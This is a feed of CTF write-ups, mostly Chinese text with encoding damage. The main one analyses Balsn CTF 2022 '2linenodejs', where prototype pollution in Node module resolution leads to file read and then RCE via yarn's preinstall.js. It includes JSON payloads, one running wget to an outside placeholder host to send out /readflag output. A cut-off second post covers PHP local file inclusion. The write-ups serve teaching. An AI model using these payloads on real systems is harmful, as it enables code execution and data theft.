base))</span><br><span class="line">    <span class="built_in">exports</span> = &#123; <span class="string">&#x27;.&#x27;</span>: <span class="built_in">exports</span> &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">ObjectPrototypeHasOwnProperty</span>(<span class="built_in">exports</span>, packageSubpath) &amp;&amp;</span><br><span class="line">      !<span class="title class_">StringPrototypeIncludes</span>(packageSubpath, <span class="string">&#x27;*&#x27;</span>) &amp;&amp;</span><br><span class="line">      !<span class="title class_">StringPrototypeEndsWith</span>(packageSubpath, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">const</span> target = <span class="built_in">exports</span>[packageSubpath];</span><br><span class="line">    <span class="keyword">const</span> resolveResult = <span class="title function_">resolvePackageTarget</span>(</span><br><span class="line">      packageJSONUrl, target, <span class="string">&#x27;&#x27;</span>, packageSubpath, base, <span class="literal">false</span>, <span class="literal">false</span>, conditions</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (resolveResult == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="title function_">throwExportsNotFound</span>(packageSubpath, packageJSONUrl, base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resolveResult;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡è°ƒè¯•å¯ä»¥çœ‹åˆ°è¿™ä¸ªå¯¹<code>exports</code>èµ‹å€¼<code>&#123;&#39;.&#39;: exports&#125;</code>ï¼Œç„¶åè¿™ä¸ªç”±äº<code>exports=packageSubpath</code>ï¼Œè¿™ä¸ª<code>if</code>è¯­å¥æ˜¯ä¸€å®šä¼šè¿›å…¥çš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥ä¼šè·å¾—<code>target = exports[packageSubpath];</code></p><p>è¿™é‡Œæˆ‘ä»¬èµ‹å€¼ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œå¦‚æœå°†exportsèµ‹å€¼ä¸º{â€˜.â€™: â€˜xxxxâ€™}ï¼Œåˆ™å¯ä»¥ä¸è¿›å…¥ifè¯­å¥ï¼Œä¸¤è€…ç­‰æ•ˆã€‚</p><p>æ¥ç€è¿›å…¥<code>resolvePackageTarget</code>ã€‚</p><h3 id="resolvePackageTarget"><a href="#resolvePackageTarget" class="headerlink" title="resolvePackageTarget"></a>resolvePackageTarget</h3><p>è¿›å…¥åï¼Œç”±äº<code>type</code>ä¸º<code>string</code>ï¼Œè¿›å…¥<code>resolvePackageTargetString</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title class_">StringPrototypeStartsWith</span>(target, <span class="string">&#x27;./&#x27;</span>)) &#123;</span><br><span class="line">   <span class="keyword">if</span> (internal &amp;&amp; !<span class="title class_">StringPrototypeStartsWith</span>(target, <span class="string">&#x27;../&#x27;</span>) &amp;&amp;</span><br><span class="line">       !<span class="title class_">StringPrototypeStartsWith</span>(target, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">     <span class="keyword">let</span> isURL = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">new</span> <span class="title function_">URL</span>(target);</span><br><span class="line">       isURL = <span class="literal">true</span>;</span><br><span class="line">     &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">       <span class="comment">// Continue regardless of error.</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (!isURL) &#123;</span><br><span class="line">       <span class="keyword">const</span> exportTarget = pattern ?</span><br><span class="line">         <span class="title class_">RegExpPrototypeSymbolReplace</span>(patternRegEx, target, <span class="function">() =&gt;</span> subpath) :</span><br><span class="line">         target + subpath;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_">packageResolve</span>(</span><br><span class="line">         exportTarget, packageJSONUrl, conditions);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title function_">throwInvalidPackageTarget</span>(match, target, packageJSONUrl, internal, base);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå¯¹<code>target</code>æ˜¯å¦ä»¥<code>./</code>å¼€å¤´è¿›è¡Œåˆ¤æ–­ï¼Œæˆ‘ä»¬å°†å…¶å€¼æ”¹ä¸º<code>./111</code>åŒæ ·å¯ä»¥è¿›å…¥ï¼Œæœ€ååˆ°new URLè¯­å¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> resolved = <span class="keyword">new</span> <span class="title function_">URL</span>(target, packageJSONUrl); </span><br></pre></td></tr></table></figure><h3 id="å†æ¬¡å›åˆ°URL"><a href="#å†æ¬¡å›åˆ°URL" class="headerlink" title="å†æ¬¡å›åˆ°URL"></a>å†æ¬¡å›åˆ°URL</h3><p>è¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„ä¸¤ä¸ªå€¼åˆ†åˆ«æ˜¯<code>./111</code>ï¼Œ ä»¥åŠæˆ‘ä»¬åˆšå¼€å§‹ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå˜é‡å³åŒ…å«äº†<code>undefined</code>çš„é‚£æ¡URLç±»è·¯å¾„ï¼Œè€Œè¿™ä¸¤ä¸ªå€¼ï¼Œéƒ½æ˜¯å¯æ§çš„ã€‚æœ€åè¯¥å‡½æ•°å°†<code>./111</code>ä»£æ›¿äº†URLçš„æœ€åä¸€ä¸ªå‚æ•°å³package.jsonï¼Œå½¢æˆæ–°çš„URLã€‚</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-10-1024x430.png"></p><p>äºæ˜¯åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±å®Œæˆäº†ç§»èŠ±æ¥æœ¨ï¼Œå°†æˆ‘ä»¬è®¾ç½®çš„è·¯å¾„å’Œæ–‡ä»¶åå…¨éƒ¨å†™äº†è¿›å»ï¼Œæœ€åè¿”å›ä¸º<code>filename</code>ç»™loaderï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-12-1024x182.png"></p><p>POC</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;.&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./11111&quot;</span> <span class="comment">// è¯»å–çš„æ–‡ä»¶å</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/xxxxpath&quot;</span><span class="punctuation">,</span> <span class="comment">// æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./11111&quot;</span> <span class="comment">// è¯»å–çš„æ–‡ä»¶å</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/xxxxpath&quot;</span><span class="punctuation">,</span> <span class="comment">// æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="â€¦å¦‚ä½•è§¦å‘catch"><a href="#â€¦å¦‚ä½•è§¦å‘catch" class="headerlink" title="â€¦å¦‚ä½•è§¦å‘catch?"></a>â€¦å¦‚ä½•è§¦å‘catch?</h2><p>ç”±äºæˆ‘ä»¬éœ€è¦æ±¡æŸ“å…¨éƒ¨çš„jsonå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ­£å¸¸è°ƒç”¨require(â€˜indexâ€™){O, o}ï¼Œæœ€åçš„æ±¡æŸ“å¯ä»¥é€šè¿‡catchæ¥è§¦å‘ï¼Œè°ƒç”¨require(â€˜.&#x2F;usageâ€™)ã€‚å½“jsonæ•°æ®ä¸æ­£å¸¸æ—¶ï¼Œæ— æ³•è¢«å½“ä½œæ­£å¸¸çš„æ•°ç»„è¿›è¡Œéå†ï¼Œå¯ä»¥è§¦å‘catchã€‚</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>dockeré‡Œçš„jsæ–‡ä»¶æ•°é‡è¿˜æ˜¯éå¸¸æƒŠäººçš„</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-13-1024x427.png"></p><p>å…³äºè¿™é‡Œå¦‚ä½•æå–åˆ°å…³é”®çš„jsæˆ‘ä¹Ÿæ²¡ä¸»æ„ï¼Œæˆ‘è§‰å¾—æ˜¯é€šè¿‡å…¨å±€æœç´¢å…³é”®å­—æœå‡ºæ¥æˆ–è€…æ˜¯æœ¬æ¥å°±è¿™ä¸ªæ–‡ä»¶æ˜¯æ•æ„Ÿæ–‡ä»¶çš„å§ï¼Œå¤§å“¥ä»¬å¸¦å¸¦ï¼Œæ€»ä¹‹æ˜¯ç¡®å®šäº†&#x2F;opt&#x2F;yarn-v1.22.19&#x2F;preinstall.jsæ˜¯å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This file is a bit weird, so let me explain with some context: we&#x27;re working</span></span><br><span class="line"><span class="comment">// to implement a tool called &quot;Corepack&quot; in Node. This tool will allow us to</span></span><br><span class="line"><span class="comment">// provide a Yarn shim to everyone using Node, meaning that they won&#x27;t need to</span></span><br><span class="line"><span class="comment">// run `npm install -g yarn`.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Still, we don&#x27;t want to break the experience of people that already use `npm</span></span><br><span class="line"><span class="comment">// install -g yarn`! And one annoying thing with npm is that they install their</span></span><br><span class="line"><span class="comment">// binaries directly inside the Node bin/ folder. And Because of this, they</span></span><br><span class="line"><span class="comment">// refuse to overwrite binaries when they detect they don&#x27;t belong to npm. Which</span></span><br><span class="line"><span class="comment">// means that, since the &quot;yarn&quot; Corepack symlink belongs to Corepack and not npm,</span></span><br><span class="line"><span class="comment">// running `npm install -g yarn` would crash by refusing to override the binary :/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// And thus we have this preinstall script, which checks whether Yarn is being</span></span><br><span class="line"><span class="comment">// installed as a global binary, and remove the existing symlink if it detects</span></span><br><span class="line"><span class="comment">// it belongs to Corepack. Since preinstall scripts run, in npm, before the global</span></span><br><span class="line"><span class="comment">// symlink is created, we bypass this way the ownership check.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// More info:</span></span><br><span class="line"><span class="comment">// https://github.com/arcanis/pmm/issues/6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">npm_config_global</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> targetPath = cp.<span class="title function_">execFileSync</span>(process.<span class="property">execPath</span>, [process.<span class="property">env</span>.<span class="property">npm_execpath</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>], &#123;</span><br><span class="line">            <span class="attr">encoding</span>: <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">            <span class="attr">stdio</span>: [<span class="string">&#x27;ignore&#x27;</span>, <span class="literal">undefined</span>, <span class="string">&#x27;ignore&#x27;</span>],</span><br><span class="line">        &#125;).<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> manifest = <span class="built_in">require</span>(<span class="string">&#x27;./package.json&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> binNames = <span class="keyword">typeof</span> manifest.<span class="property">bin</span> === <span class="string">&#x27;string&#x27;</span></span><br><span class="line">            ? [manifest.<span class="property">name</span>.<span class="title function_">replace</span>(<span class="regexp">/^@[^\/]+\//</span>, <span class="string">&#x27;&#x27;</span>)]</span><br><span class="line">            : <span class="keyword">typeof</span> manifest.<span class="property">bin</span> === <span class="string">&#x27;object&#x27;</span> &amp;&amp; manifest.<span class="property">bin</span> !== <span class="literal">null</span></span><br><span class="line">                ? <span class="title class_">Object</span>.<span class="title function_">keys</span>(manifest.<span class="property">bin</span>)</span><br><span class="line">                : [];</span><br><span class="line"></span><br><span class="line">        binNames.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">binName</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> binPath = path.<span class="title function_">join</span>(targetPath, binName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> binTarget;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                binTarget = fs.<span class="title function_">readlinkSync</span>(binPath);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (binTarget.<span class="title function_">startsWith</span>(<span class="string">&#x27;../lib/node_modules/corepack/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.<span class="title function_">unlinkSync</span>(binPath);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="comment">// ignore errors</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ifè¯­å¥æ£€æŸ¥äº†process.env.npm_config_globalï¼Œé»˜è®¤ä¸ºundefinedï¼Œå¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“å¯¹å…¶èµ‹å€¼ï¼›åˆ†åˆ«åŒ…å«äº†å‘½ä»¤æ‰§è¡Œæ–‡ä»¶è¯»å–çš„åŒ…ï¼Œç„¶åè°ƒç”¨child_process.execFileSyncï¼Œè¯¥å‡½æ•°åŒæ­¥åˆ›å»ºè¿›ç¨‹è°ƒç”¨shellï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä¸å¯æ§ï¼Œä¸ºnodeçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªå‚æ•°åŒæ ·ä¹Ÿæ˜¯process.envçš„process.env.npm_execpathï¼Œä¾ç„¶å¯æ§ï¼ŒåŒæ—¶ç”±äºnodeæ”¯æŒ-evalæ¥æ‰§è¡Œjavascriptå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨-evalæ¥æ‰§è¡ŒjavascriptæŒ‡ä»¤ã€‚</p><p>POC:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./preinstall.js&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_config_global&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_execpath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--eval=require(&#x27;child_process&#x27;).execSync(&#x27;wget$&#123;IFS&#125;https://xxx/`/readflag`&#x27;)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./usage&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;exports&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;.&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./preinstall.js&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_config_global&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;npm_execpath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--eval=require(&#x27;child_process&#x27;).execSync(&#x27;wget$&#123;IFS&#125;https://xxx/`/readflag`&#x27;)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs">https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™é¢˜çš„å‡ºé¢˜äººå»å¹´ä¹Ÿå‡ºäº†0linephpå’Œ1linephpï¼Œç”¨æœ€çŸ­çš„é¢˜ç›®ææœ€éªšçš„æ“ä½œã€‚æƒ³äº†å¾ˆå¤šæ€è·¯ä¸å¾—å…¶è§£ï¼Œæ ¹æ®èµ›åWriteupè¿›è¡Œç ”ç©¶å¤ç°ï¼Œä¸»è¦æ˜¯åˆ†æä¸€ä¸‹è°ƒè¯•çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;env&quot;&gt;&lt;a href=&quot;#env&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="RCE" scheme="https://lhhxs.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>PHPä¼ªåè®®å°æ€»ç»“</title>
    <link href="https://lhhxs.github.io/2022/09/09/WEB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://lhhxs.github.io/2022/09/09/WEB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2022-09-09T12:34:23.046Z</published>
    <updated>2022-09-09T14:24:51.800Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHPä¼ªåè®®å°æ€»ç»“"><a href="#PHPä¼ªåè®®å°æ€»ç»“" class="headerlink" title="PHPä¼ªåè®®å°æ€»ç»“"></a>PHPä¼ªåè®®å°æ€»ç»“</h1><h1 id="åˆæ­¥æ¢ç´¢"><a href="#åˆæ­¥æ¢ç´¢" class="headerlink" title="åˆæ­¥æ¢ç´¢"></a><a href="#%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%B4%A2" title="åˆæ­¥æ¢ç´¢"></a>åˆæ­¥æ¢ç´¢</h1><p>é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªç•Œé¢</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/1.png"></p><p>åªæœ‰ä¸€ä¸ªé“¾æ¥åˆ°â€.&#x2F;post&#x2F;index.php?file&#x3D;show.phpâ€</p><p>ç‚¹è¿›å»ä¹‹ååªæ˜¾ç¤ºtest5</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/2.png"></p><p>æŸ¥çœ‹æºä»£ç ä¹‹åä¹Ÿæ‰¾ä¸åˆ°å¤´ç»ª<br>_SQL_æ³¨å…¥ä¹Ÿæ²¡ç”¨</p><h1 id="æŸ¥æ‰¾writeup"><a href="#æŸ¥æ‰¾writeup" class="headerlink" title="æŸ¥æ‰¾writeup"></a><a href="#%E6%9F%A5%E6%89%BEwriteup" title="æŸ¥æ‰¾writeup"></a>æŸ¥æ‰¾writeup</h1><p>ç»“æœï¼š</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/3.png"></p><p>ç›´æ¥æ˜¾ç¤ºå‡ºç½‘é¡µæºä»£ç çš„_Base64_ç¼–ç </p><p>æ‹¿å»ç¼–ç ä¹‹åå¾—å‡ºç»“æœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="PHPä¼ªåè®®çŸ¥è¯†"><a href="#PHPä¼ªåè®®çŸ¥è¯†" class="headerlink" title="PHPä¼ªåè®®çŸ¥è¯†"></a><a href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9F%A5%E8%AF%86" title="PHPä¼ªåè®®çŸ¥è¯†"></a>PHPä¼ªåè®®çŸ¥è¯†</h1><p><em>è¿™é“é¢˜ç”¨äº†PHPä¼ªåè®®çŸ¥è¯†ï¼ŒPHPä¼ªåè®®ï¼Œå®è´¨ä¸Šå°±æ˜¯æ”¯æŒçš„åè®®ä¸å°è£…åè®®</em></p><p>æ”¯æŒçš„æœ‰_12_ç§</p><ul><li>file:&#x2F;&#x2F; â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</li><li>http:&#x2F;&#x2F; â€” è®¿é—® HTTP(s) ç½‘å€</li><li>ftp:&#x2F;&#x2F; â€” è®¿é—® FTP(s) URLs</li><li>php:&#x2F;&#x2F; â€” 